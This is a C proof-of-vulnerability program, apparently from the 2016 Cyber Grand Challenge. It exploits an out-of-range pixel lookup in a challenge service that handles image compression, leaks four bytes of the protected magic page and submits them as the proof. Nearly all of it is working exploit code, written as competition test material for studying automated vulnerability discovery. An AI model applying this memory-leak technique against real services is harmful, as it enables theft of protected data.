/*

Author: Dan Czarnecki <cgc@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libpov.h>
#include <libcgc.h>

int SendToCB(char *buf, int length) {
  int total_sent = 0;
  int ret;
  size_t bytes_sent = 0;
  while(total_sent < length) {
    ret = transmit(1, buf + total_sent, length - total_sent, &bytes_sent);
    if (ret != 0) {
      // error
      return -1;
    }
    if (bytes_sent == 0) {
      break;
    }
    total_sent += bytes_sent;
  }
  return bytes_sent;
}

size_t read_string( char* buffer, int count, char terminator)
{
  size_t TotalBytes = 0;
  size_t rx_bytes;

  if (!buffer) {
    return(0);
  }

  while (TotalBytes < count)
  {
    if (receive(0, buffer+TotalBytes, 1, &rx_bytes) != 0)
    {
      _terminate(0);
    }
    if (rx_bytes == 0)
    {
      _terminate(0);
    }

    if ( *(buffer + TotalBytes) == terminator )
    {
      buffer[TotalBytes] = '\0';
      return TotalBytes;
    }

    TotalBytes += rx_bytes;
  }

  return(TotalBytes);
}


int ReceiveFromCB(char *buf, int length) {
  size_t total_received = 0;
  size_t bytes_received = 0;
  int ret;
  while (total_received < length) {
    ret = receive(0, buf + total_received , length - total_received , &bytes_received);
    if (ret != 0) {
      return -1;
    }
    if (bytes_received == 0) {
      break;
    }
    total_received += bytes_received;
  }
  return total_received;
}

int CheckMatch(char *response, char *match, int length)
{
  for (int i=0; i < length; i++)
  {
    if (response[i] != match[i])
    {
      return -1;
    }
  }
  return 0;
}

void *memcpy( void *pDest, const void *pSource, size_t nbytes )
{
  void *pDestReturn = pDest;

  while ( nbytes >= 4 )
  {
    *((uint32_t*)pDest) = *((uint32_t*)pSource);

    pDest += 4;
    pSource += 4;
    nbytes-=4;
  }

  while ( nbytes > 0 )
  {
    *((uint8_t*)pDest) = *((uint8_t*)pSource);

    pDest++;
    pSource++;
    nbytes--;
  }

  return (pDestReturn);
}

int main(void) {
  // negotiate
  type2_vals t2vals;
  type2_negotiate(&t2vals);

  // perform POV
  char buffer[4096];
  size_t txSize = 0;

  // Read Hello
  read_string(buffer, 256, '\n');

  // Select NEW_FILE
  memcpy(buffer, "\x01", 1);
  SendToCB(buffer, 1);

  // NEW_FILE selected message
  read_string(buffer, 256, '\n');
  read_string(buffer, 256, '\n');

  // padding data
  memcpy(buffer, "\xc0\xc0", 2);
  SendToCB(buffer, 2);

  // flip the magic page bytes so it can be read properly
  uint32_t addr1 = (uint16_t)(t2vals.region_addr<<16 | t2vals.region_addr>>16);
  uint32_t addr2 = (uint16_t)(t2vals.region_addr<<0 | t2vals.region_addr>>0);

  for(int i = 0; i < 4088; i+=4)
  {
    // send new file data
    SendToCB((char*)&addr1, 2);
    SendToCB((char*)&addr2, 2);

  }

  // new file loaded message
  read_string(buffer, 256, '\n');

  // send Compress command
  memcpy(buffer, "\x07", 1);
  SendToCB(buffer, 1);

  // COMPRESS selected message
  read_string(buffer, 256, '\n');

  // send Decompress command
  memcpy(buffer, "\x08", 1);
  SendToCB(buffer, 1);

  // DECOMPRESS selected message
  read_string(buffer, 256, '\n');

  // send SHOW_PIXEL command
  memcpy(buffer, "\x09", 1);
  SendToCB(buffer, 1);

  memset(buffer, 0, 256);

  // SHOW_PIXEL selected
  read_string(buffer, 256, '\n');
  // Pixel selection prompt
  read_string(buffer, 256, '\n');

  memcpy(buffer, "\x02\x02", 2);
  SendToCB(buffer, 2);
  //transmit(2, buffer, 64, &rxSize);

  // Out of range message
  read_string(buffer, 256, '\n');
  //transmit(2, buffer, 64, &rxSize);

  // XYZ pixel info with leak
  read_string(buffer, 256, '\n');

  // color string
  read_string(buffer, 256, '\n');

  char *end;
  int secret1, secret2;
  char val1[5];
  char val2[5];
  memcpy(val1, buffer+8, 4);
  memcpy(val2, buffer+12, 4);

  secret1 = (int)strtol(val1, &end, 16);
  secret2 = (int)strtol(val2, &end, 16);

  secret1 = (secret1>>8) | (secret1<<8);
  secret2 = (secret2>>8) | (secret2<<8);

  unsigned char secret[4];
  memcpy(secret, &secret1, 2);
  memcpy(secret+2, &secret2, 2);

  // new line
  read_string(buffer, 256, '\n');

  memcpy(buffer, "\x0b", 1);
  SendToCB(buffer, 1);

  // exit
  read_string(buffer, 256, '\n');

  // submit the secret
  type2_submit((unsigned char*)secret, 4);

  return 0;
}
